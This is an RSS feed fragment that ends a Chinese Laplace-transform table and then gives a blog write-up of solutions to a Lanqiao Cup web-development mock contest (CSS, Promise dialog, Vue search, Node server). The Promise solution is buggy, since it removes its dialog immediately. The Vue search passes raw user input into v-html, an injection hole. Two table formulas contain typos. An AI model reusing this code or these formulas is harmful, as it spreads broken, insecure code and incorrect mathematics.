&lt;td&gt;$$\delta&apos;(t)$$&lt;/td&gt;
&lt;td&gt;$$s$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$\delta(t)$$&lt;/td&gt;
&lt;td&gt;$$1$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$u(t)$$&lt;/td&gt;
&lt;td&gt;$$\dfrac 1 s$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$e^{-at}$$&lt;/td&gt;
&lt;td&gt;$$\dfrac 1 {s+a}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$te^{-at}$$&lt;/td&gt;
&lt;td&gt;$$\dfrac{1}{(s+a)^2}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$t$$&lt;/td&gt;
&lt;td&gt;$$\dfrac 1 {s^2}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$\dfrac{t^2}2$$&lt;/td&gt;
&lt;td&gt;$$\dfrac{1}{s^3}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$\dfrac{t^n}{n!}$$&lt;/td&gt;
&lt;td&gt;$$\dfrac{1}{s^{n+1}}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$\delta(t-t_0)$$&lt;/td&gt;
&lt;td&gt;$$e^{-{t_0}s}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$\cos(\alpha t)$$&lt;/td&gt;
&lt;td&gt;$$\dfrac s {s^2+\alpha^2}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$\sin(\alpha t)$$&lt;/td&gt;
&lt;td&gt;$$\dfrac \alpha {s^2+\alpha^2}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$f(a t)$$&lt;/td&gt;
&lt;td&gt;$$\displaystyle{\frac{1}{|a|}f \left( \dfrac sa \right)}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$f(t-a)u(t-a)$$&lt;/td&gt;
&lt;td&gt;$$e^{-as} F(s)$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$e^{at} f(t)$$&lt;/td&gt;
&lt;td&gt;$$F(s-a)$$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;微分和积分&lt;/h2&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;时域 $f(t)$&lt;/th&gt;
&lt;th&gt;频域 $F(s)=\mathscr L[f(t)]$&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;$$\dfrac{\mathrm df(t)}{\mathrm dt}$$&lt;/td&gt;
&lt;td&gt;$$sF(s)-f(0)$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$\dfrac{\mathrm d^2f(t)}{\mathrm dt^2}$$&lt;/td&gt;
&lt;td&gt;$$s^2F(s)-sf(0)-f&apos;(0)$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$\dfrac{\mathrm d^nf(t)}{\mathrm dt^n}$$&lt;/td&gt;
&lt;td&gt;$$s^nF(s)-\displaystyle{\sum^n_{k-1}s^{k-1}f^{(n-k)}(0)}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$tf(t)$$&lt;/td&gt;
&lt;td&gt;$$-F&apos;(s)$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$(-1)^n t^n f(t)$$&lt;/td&gt;
&lt;td&gt;$$F^{(n)}(s)$$&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;$$\dfrac 1 t f(t)$$&lt;/td&gt;
&lt;td&gt;$$\displaystyle{\int_s^\infty F(σ)\mathrm dσ}$$&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
</content:encoded></item><item><title>第十四届蓝桥杯（Web 应用开发）第二次模拟赛题解</title><link>https://blog.xinshijiededa.men/lanqiao-14-web-2/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/lanqiao-14-web-2/</guid><description>2022 年，我所用的语言被评为全球最烂语言。为什么呢？垃圾框架层出不穷，运行环境千差万别，类型错误数量全网第一。这是事实，无法否认，但开发者们还是蜂拥而来。这语言总会给你一丝希望，vite 也好，next 也罢，但如此近，仿佛触手可及，让人奋不顾身。</description><pubDate>Sat, 26 Nov 2022 22:32:32 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;2022 年，我所用的语言被评为全球最烂语言。为什么呢？垃圾框架层出不穷，运行环境千差万别，类型错误数量全网第一。&lt;/p&gt;
&lt;p&gt;这是事实，无法否认，但开发者们还是蜂拥而来。这语言总会给你一丝希望，vite 也好，next 也罢，但如此近，仿佛触手可及，让人奋不顾身。&lt;/p&gt;
&lt;p&gt;这里充斥着网页，而我正是那页面仔！&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;代码请移步至 GitHub &lt;a href=&quot;https://github.com/OverflowCat/lanqiao-14-web&quot;&gt;OverflowCat/lanqiao-14-web&lt;/a&gt;。&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;凭空消失的 TA&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;初始代码中的 &lt;code&gt;index.html&lt;/code&gt; 在浏览器中并没有显示出来表单组件 &lt;code&gt;myform&lt;/code&gt;。考生需要认真检查提供的代码，找出表单消失的原因，并修复掉，最终让表单 “重见天日”。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;p&gt;这题跟 Vue 2 半毛钱关系没有，单纯是 &lt;code&gt;index.html&lt;/code&gt; 中没有引用 Element UI 的 js 😅&lt;/p&gt;
&lt;h3&gt;代码&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-diff&quot;&gt;diff --git 凭空消失的TA/index.html
@@ -8,6 +8,7 @@  &amp;lt;title&amp;gt;凭空消失的 TA&amp;lt;/title&amp;gt;
  &amp;lt;script src=&amp;quot;./js/vue.min.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;script src=&amp;quot;./js/http-vue-loader.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
+ &amp;lt;script src=&amp;quot;./element-ui-2.15.10/index.js&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
  &amp;lt;!-- 引入 element-ui 样式 --&amp;gt;
  &amp;lt;link rel=&amp;quot;stylesheet&amp;quot; href=&amp;quot;./element-ui-2.15.10/index.css&amp;quot; /&amp;gt;
&amp;lt;/head&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;用户名片&lt;/h2&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;The year is 2049...&lt;/p&gt;
&lt;p&gt;All websites use Tailwind, there are only 69 people remaining that know how to write custom CSS.&lt;/p&gt;
&lt;p&gt;These 69 people have to center divs to save the world.&lt;/p&gt;
&lt;p&gt;They are our only hope.&lt;/p&gt;
&lt;p&gt;(This is my pitch to Netflix for an upcoming movie)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Credit: &lt;a href=&quot;https://twitter.com/thejackforge/status/1560637007742701570&quot;&gt;TheJackForge&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;In case you still do not know how to center &lt;code&gt;div&lt;/code&gt;s horizontally &amp;amp; vertically, refer to &lt;a href=&quot;https://blog.hubspot.com/website/center-div-css&quot;&gt;11 Ways to Center Div or Text in Div in CSS&lt;/a&gt; or &lt;a href=&quot;https://segmentfault.com/a/1190000014116655&quot;&gt;CSS-水平居中、垂直居中、水平垂直居中&lt;/a&gt;.&lt;/p&gt;
&lt;h3&gt;代码&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/OverflowCat/lanqiao-14-web/master/%E7%94%A8%E6%88%B7%E5%90%8D%E7%89%87/center-divs.webp&quot; alt=&quot;效果图&quot;&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-css&quot;&gt;.avatar,
.card {
  position: absolute;
  left: 0;
  top: 0;
  bottom: 0;
  right: 0;
  margin: auto;
}

.user-card {
  width: 150px;
  height: 100%;
  position: relative;
  float: left;
  display: flex;
  justify-content: center;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;芝麻开门&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;找到 &lt;code&gt;index.js&lt;/code&gt; 文件中的 &lt;code&gt;mPrompt&lt;/code&gt; 函数，完成函数中的 TODO 部分。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;点击 “点击弹出对话框，输入咒语” 按钮会调用 &lt;code&gt;mPrompt&lt;/code&gt; 函数，&lt;code&gt;mPrompt&lt;/code&gt; 调用后页面显示对话框。&lt;code&gt;mPrompt&lt;/code&gt; 函数必须返回一个 &lt;code&gt;promise&lt;/code&gt; 对象。&lt;/li&gt;
&lt;li&gt;在对话框中的输入框中输入文字后，点击确认按钮，对话框消失， &lt;code&gt;promise&lt;/code&gt; 返回成功，&lt;code&gt;promise&lt;/code&gt; 成功的值为输入的值。&lt;/li&gt;
&lt;li&gt;只有当成功的值为 “芝麻开门” 时门自动打开（已实现）。&lt;/li&gt;
&lt;li&gt;点击取消，对话框消失，&lt;code&gt;promise&lt;/code&gt; 返回失败，失败的值为 &lt;code&gt;false&lt;/code&gt;。&lt;/li&gt;
&lt;li&gt;对话框的显示隐藏请使用 DOM 节点的添加删除实现。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;p&gt;本题考察 Promise。在返回的 Promise 中添加 onclick 事件，并在函数中调用 Promise 的参数。&lt;/p&gt;
&lt;h3&gt;代码&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const incantations = &amp;quot;芝麻开门&amp;quot;;
function init(el) {
  document.querySelector(&amp;quot;.wrapper .btn&amp;quot;).addEventListener(&amp;quot;click&amp;quot;, () =&amp;gt; {
    mPrompt()
      .then((res) =&amp;gt; {
        if (res === incantations) {
          document
            .querySelectorAll(&amp;quot;#door .doors&amp;quot;)[0]
            .classList.add(&amp;quot;door-left&amp;quot;);
          document
            .querySelectorAll(&amp;quot;#door .doors&amp;quot;)[1]
            .classList.add(&amp;quot;door-right&amp;quot;);
        }
      })
      .catch((err) =&amp;gt; {
        console.log(err);
      });
  });
}
/**
 * @description: 调用函数，开启弹窗，记录输入框的内容，并通过 promise 异步返回输入框中的内容
 * @return {Promise}
 */
function mPrompt() {
  // 弹窗必须使用以下结构 template 保存的是弹窗的结构字符串，可以先转化为 DOM 再通过 appendChild 方式插入到 body 中
  const template = `
        &amp;lt;div class=&amp;quot;modal&amp;quot;&amp;gt;
            &amp;lt;div class=&amp;quot;message-box&amp;quot;&amp;gt;
                &amp;lt;div class=&amp;quot;message-header&amp;quot;&amp;gt;请输入咒语&amp;lt;/div&amp;gt;
                &amp;lt;div class=&amp;quot;message-body&amp;quot;&amp;gt;
                    &amp;lt;input type=&amp;quot;text&amp;quot;&amp;gt;
                &amp;lt;/div&amp;gt;
                &amp;lt;div class=&amp;quot;message-footer&amp;quot;&amp;gt;
                    &amp;lt;button class=&amp;quot;btn btn-small&amp;quot; id=&apos;cancel&apos;&amp;gt;取消&amp;lt;/button&amp;gt;
                    &amp;lt;button class=&amp;quot;btn btn-small btn-primary&amp;quot; id=&apos;confirm&apos;&amp;gt;确定&amp;lt;/button&amp;gt;
                &amp;lt;/div&amp;gt;
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
    `;
  const div = document.createElement(&amp;quot;div&amp;quot;);
  // TODO：待补充代码
  div.innerHTML = template;
  document.body.appendChild(div);
  const hide = () =&amp;gt; div.remove();
  return new Promise(
    (resolve, reject) =&amp;gt; {
      div.querySelector(&amp;quot;button#cancel&amp;quot;).onclick = e =&amp;gt; {
        hide();
        reject(false);
      }
      div.querySelector(&amp;quot;button#confirm&amp;quot;).onclick = e =&amp;gt; {
        resolve(div.querySelector(&amp;quot;input&amp;quot;).value);
      }
      hide();
    }
  );
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;宝贵的一票&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;完成 &lt;code&gt;index.html&lt;/code&gt; 文件中的 TODO 部分。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;点击添加选项，页面中新增一个选项。选项前文字按照：选项 1，选项 2，选项 3 ...... 顺序排列，当页面中的选项大于 2 个时，选项后面跟随删除按钮（即 x 图标）。带有删除图标的选项 DOM 结构如下：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;&amp;lt;div&amp;gt;
  &amp;lt;label&amp;gt;选项1&amp;lt;/label&amp;gt;
  &amp;lt;div&amp;gt;
    &amp;lt;input type=&amp;quot;text&amp;quot; /&amp;gt;
  &amp;lt;/div&amp;gt;
  &amp;lt;div&amp;gt;
    &amp;lt;!-- 删除图标 --&amp;gt;
    &amp;lt;img src=&amp;quot;./images/x.svg&amp;quot; alt=&amp;quot;&amp;quot; /&amp;gt;
  &amp;lt;/div&amp;gt;
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;2&quot;&gt;
&lt;li&gt;点击删除按钮，删除当前选项，并且选项前文字按照：选项 1，选项 2，选项 3 ...... 顺序排列，当选项数量小于等于 2 个时，选项后面无删除按钮。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;p&gt;这题要求点删除按钮的时候删除的是对应的文本框，并且后面的选项序号需要再次排序。注意如果增加了选项的话，&lt;code&gt;选项1&lt;/code&gt; 和 &lt;code&gt;选项2&lt;/code&gt; 也是需要删除按钮的。直接 &lt;code&gt;querySelector&lt;/code&gt; 改内容就好了，注意 template 的结构。&lt;/p&gt;
&lt;h3&gt;代码&lt;/h3&gt;
&lt;p&gt;见 &lt;code&gt;./宝贵的一票/index.html&lt;/code&gt;。&lt;/p&gt;
&lt;h2&gt;粒粒皆辛苦&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;介绍&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;俗话说 “民以食为天”，粮食的收成直接影响着民生问题，通过对农作物产量的统计数据也能分析出诸多实际问题。&lt;/p&gt;
&lt;p&gt;接下来就让我们使用 ECharts 图表，完成 X 市近五年来的农作物产量的统计图吧～&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;准备&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;本题已经内置了初始代码，打开实验环境，目录结构如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;├── data.json
├── index.html
└── js
    ├── axios.min.js
    └── echarts.min.js
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;其中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;index.html&lt;/code&gt; 是主页面。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;js/echarts.min.js&lt;/code&gt; 是 ECharts 文件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;js/axios.min.js&lt;/code&gt; 是 axios 文件。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;data.json&lt;/code&gt; 是对应年份的粮食产量数据，单位为万吨。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;选中 &lt;code&gt;index.html&lt;/code&gt; 右键启动 Web Server 服务（Open with Live Server），让项目运行起来。&lt;/p&gt;
&lt;p&gt;接着，打开环境右侧的【Web 服务】，就可以在浏览器中看到如下效果：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;目标&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;请完成 &lt;code&gt;index.html&lt;/code&gt; 文件中的 TODO 部分。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;完成数据请求（数据来源 &lt;code&gt;./data.json&lt;/code&gt;）。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;data.json&lt;/code&gt; 中的数据中英文对照如下：
&amp;lt;table&amp;gt;&amp;lt;thead&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th align=&amp;quot;center&amp;quot;&amp;gt;英文名称&amp;lt;/th&amp;gt;&amp;lt;th align=&amp;quot;center&amp;quot;&amp;gt;中文名称&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/thead&amp;gt;&amp;lt;tbody&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td align=&amp;quot;center&amp;quot;&amp;gt;wheat&amp;lt;/td&amp;gt;&amp;lt;td align=&amp;quot;center&amp;quot;&amp;gt;小麦&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td align=&amp;quot;center&amp;quot;&amp;gt;soybean&amp;lt;/td&amp;gt;&amp;lt;td align=&amp;quot;center&amp;quot;&amp;gt;大豆&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td align=&amp;quot;center&amp;quot;&amp;gt;potato&amp;lt;/td&amp;gt;&amp;lt;td align=&amp;quot;center&amp;quot;&amp;gt;马铃薯&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td align=&amp;quot;center&amp;quot;&amp;gt;corn&amp;lt;/td&amp;gt;&amp;lt;td align=&amp;quot;center&amp;quot;&amp;gt;玉米&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/tbody&amp;gt;&amp;lt;/table&amp;gt;&lt;/li&gt;
&lt;li&gt;在页面的折线图和饼形图中正确显示粮食产量数据。其中折线图为五年数据，饼图只显示 2022 年数据。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;myChart.setOption()&lt;/code&gt; 更新数据。EChart 会检测 diff。这个框架可以看一看 &lt;a href=&quot;https://www.runoob.com/echarts/echarts-ajax-data.html&quot;&gt;菜鸟教程&lt;/a&gt;。&lt;/p&gt;
&lt;h2&gt;绝美宋词&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;请使用 Vue ，完成 &lt;code&gt;index.html&lt;/code&gt; 文件中的 TODO 部分。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;完成数据请求（数据来源 &lt;code&gt;./data.json&lt;/code&gt;），&lt;code&gt;data.json&lt;/code&gt; 是宋词数据，&lt;code&gt;poetry_content&lt;/code&gt; 表示词句，&lt;code&gt;title&lt;/code&gt; 表示词牌名，&lt;code&gt;author&lt;/code&gt; 表示词人。&lt;/li&gt;
&lt;li&gt;在输入框输入关键词时在 &lt;code&gt;ul&lt;/code&gt;（&lt;code&gt;class = suggestions&lt;/code&gt;）的元素中&lt;strong&gt;实时显示&lt;/strong&gt;词牌名、词句、词人中包含关键词的&lt;strong&gt;完整词句（包含词牌名、词人）列表&lt;/strong&gt;，当关键词为空或者匹配不到时 &lt;code&gt;ul&lt;/code&gt;（&lt;code&gt;class = suggestions&lt;/code&gt;）元素的子节点为空。完整词句的 DOM 结构按照如下规定显示：&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;li&amp;gt;
  &amp;lt;span&amp;gt;词句&amp;lt;/span&amp;gt;
  &amp;lt;span&amp;gt;词牌名 - 词人&amp;lt;/span&amp;gt;
&amp;lt;/li&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;例：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;li&amp;gt;
  &amp;lt;span
    &amp;gt;常记溪亭日暮，沉醉不知归路。兴尽晚回舟，误入藕花深处。争渡，争渡，惊起一滩鸥鹭&amp;lt;/span
  &amp;gt;
  &amp;lt;span&amp;gt;如梦令 - 李清照&amp;lt;/span&amp;gt;
&amp;lt;/li&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;高亮匹配到的所有词句中的关键词。即使用 &lt;code&gt;&amp;lt;span&amp;gt;&amp;lt;/span&amp;gt;&lt;/code&gt; 标签包裹所有关键词。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;例：(关键词：雨)&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;&amp;lt;li&amp;gt;
  &amp;lt;span
    &amp;gt;寒蝉凄切，对长亭晚，骤&amp;lt;span&amp;gt;雨&amp;lt;/span
    &amp;gt;初歇。都门帐饮无绪，方留恋处，兰舟催发。执手相看泪眼，竟无语凝噎。念去去千里烟波，暮霭沉沉楚天阔。多情自古伤离别，更那堪冷落清秋节。今宵酒醒何处，杨柳岸晓风残月。此去经年，应是良辰美景虚设。便纵有千种风情，更与何人说&amp;lt;/span
  &amp;gt;
  &amp;lt;span&amp;gt;&amp;lt;span&amp;gt;雨&amp;lt;/span&amp;gt;霖铃 - 柳永&amp;lt;/span&amp;gt;
&amp;lt;/li&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;：&lt;strong&gt;本题要求的是实时显示，即输入完成的同时显示结果，非失去焦点显示&lt;/strong&gt;。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;p&gt;这是我第一次用 Vue。在 Vue 2 中把 &lt;code&gt;&amp;lt;input/&amp;gt;&lt;/code&gt; 的 &lt;code&gt;value&lt;/code&gt; 绑定到变量并且在 &lt;code&gt;input&lt;/code&gt; 更新时调用函数的方法：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-diff&quot;&gt;&amp;lt;input
type=&amp;quot;text&amp;quot;
id=&amp;quot;search&amp;quot;
class=&amp;quot;search&amp;quot;
placeholder=&amp;quot;词牌名 词句 词人&amp;quot;
+ v-model=&amp;quot;query&amp;quot;
+ @input=&amp;quot;handleInput&amp;quot;
/&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;根据文档，&lt;code&gt;@input&lt;/code&gt; 会过滤掉 IME 的 buffer。题目给的效果图好像并没有这个行为，不过也过了，毕竟不知评测机制，并且没人会写带 IME 的 test。&lt;/p&gt;
&lt;h3&gt;代码&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-diff&quot;&gt;@@ -14,8 +14,12 @@
    &amp;lt;h1 style=&amp;quot;text-align: center&amp;quot;&amp;gt;输入关键字，找一首词&amp;lt;/h1&amp;gt;
    &amp;lt;!-- TODO：待补充代码 --&amp;gt;
    &amp;lt;div class=&amp;quot;search-form&amp;quot;&amp;gt;
-     &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;search&amp;quot; class=&amp;quot;search&amp;quot; placeholder=&amp;quot;词牌名 词句 词人&amp;quot; /&amp;gt;
+     &amp;lt;input type=&amp;quot;text&amp;quot; id=&amp;quot;search&amp;quot; class=&amp;quot;search&amp;quot; placeholder=&amp;quot;词牌名 词句 词人&amp;quot; v-model=&amp;quot;query&amp;quot; @input=&amp;quot;handleInput&amp;quot; /&amp;gt;
      &amp;lt;ul class=&amp;quot;suggestions&amp;quot;&amp;gt;
+       &amp;lt;li v-for=&amp;quot;poem in filtered&amp;quot;&amp;gt;
+         &amp;lt;span class=&amp;quot;poet&amp;quot; v-html=&amp;quot;poem.poetry_content&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;
+         &amp;lt;span class=&amp;quot;title&amp;quot; v-html=&amp;quot;poem.title&amp;quot;&amp;gt;&amp;lt;/span&amp;gt;
+       &amp;lt;/li&amp;gt;
      &amp;lt;/ul&amp;gt;
    &amp;lt;/div&amp;gt;
  &amp;lt;/div&amp;gt;
@@ -23,6 +27,40 @@
    let vm = new Vue({
      el: &apos;#app&apos;,
      // TODO：待补充代码
+     data: {
+       query: &apos;&apos;,
+       poems: [],
+       filtered: []
+     },
+     created() {
+       this.queryData()
+     },
+     methods: {
+       highlight(text) {
+         return `&amp;lt;span class=&amp;quot;highlight&amp;quot;&amp;gt;${text}&amp;lt;/span&amp;gt;`;
+       },
+       queryData() {
+         axios.get(&apos;./data.json&apos;).then(res =&amp;gt; {
+           this.poems = res.data;
+         })
+       },
+       handleInput(e) {
+         if (this.query) this.filterData(this.query);
+         else this.filterData(&amp;quot;哈哈哈没有东西!!&amp;quot;)
+       },
+       filterData(keyword) {
+         this.filtered = this.poems.filter(
+           x =&amp;gt; x.poetry_content.includes(keyword)
+             || x.author.includes(keyword)
+             || x.title.includes(keyword)
+         ).map(x =&amp;gt; {
+           return {
+             poetry_content: x.poetry_content.replaceAll(keyword, this.highlight(keyword)),
+             title: `${x.title} - ${x.author}`.replaceAll(keyword, this.highlight(keyword)),
+           }
+         })
+       }
+     }
    })
  &amp;lt;/script&amp;gt;
&amp;lt;/body&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;资讯接口&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;介绍&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;随着技术的发展，很多前端工程师已经不满足于只做诸如页面布局和交互这些开发工作了，很多人将目光逐渐转向了 “大前端” 范围，其中就包括不需要依赖后端提供接口自己就可以使用 node.js 编写一个后端接口服务。&lt;/p&gt;
&lt;p&gt;下面就让我们也来使用 node.js 完成一个新闻资讯接口吧。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;目标&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过在 &lt;code&gt;app.js&lt;/code&gt; 书写代码，创建一个服务器，使服务在 &lt;strong&gt;8080&lt;/strong&gt; 端口运行。&lt;/li&gt;
&lt;li&gt;访问 &lt;code&gt;/news&lt;/code&gt; 返回资讯数据，访问其他任意路径均返回&lt;strong&gt;字符串 404&lt;/strong&gt; 。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&amp;lt;table&amp;gt;&amp;lt;thead&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;th&amp;gt;Url&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;请求方式&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;参数&amp;lt;/th&amp;gt;&amp;lt;th&amp;gt;响应结果&amp;lt;/th&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/thead&amp;gt;&amp;lt;tbody&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;news&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;GET&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;空&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;显示资讯数据&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/tbody&amp;gt;&amp;lt;/table&amp;gt;&lt;/p&gt;
&lt;p&gt;数据需要设置为 &lt;code&gt;utf8&lt;/code&gt; 格式，资讯数据格式如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;[
  {
    &amp;quot;channelId&amp;quot;: &amp;quot;5572a108b3cdc86cf39001cd&amp;quot;,
    &amp;quot;name&amp;quot;: &amp;quot;国内焦点&amp;quot;
  },
  {
    &amp;quot;channelId&amp;quot;: &amp;quot;5572a108b3cdc86cf39001ce&amp;quot;,
    &amp;quot;name&amp;quot;: &amp;quot;国际焦点&amp;quot;
  }
]
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;设置 &lt;code&gt;utf8&lt;/code&gt; 格式代码:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;res.setHeader(&amp;quot;Content-type&amp;quot;, &amp;quot;text/html;charset=utf8&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;
&lt;ol start=&quot;3&quot;&gt;
&lt;li&gt;通过 &lt;code&gt;node app.js&lt;/code&gt; 运行代码，使服务处于运行状态，点击右侧 【web 服务】，页面上显示访问域名 +&apos;/news&apos; 返回资讯数据。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;h3&gt;思路&lt;/h3&gt;
&lt;p&gt;使用 &lt;code&gt;http.createServer()&lt;/code&gt;。注意一下设置 &lt;code&gt;Content-type&lt;/code&gt; 的方式。&lt;/p&gt;
&lt;h3&gt;代码&lt;/h3&gt;
&lt;p&gt;见对应目录。&lt;/p&gt;
&lt;h2&gt;平地起高楼&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;p&gt;相当于把 &lt;code&gt;{id: number, parent_id: number: name}[]&lt;/code&gt; 嵌套起来返回 &lt;code&gt;{id: number, parent_id: number: name, children: self[]}&lt;/code&gt;。&lt;/p&gt;
&lt;h3&gt;思路&lt;/h3&gt;
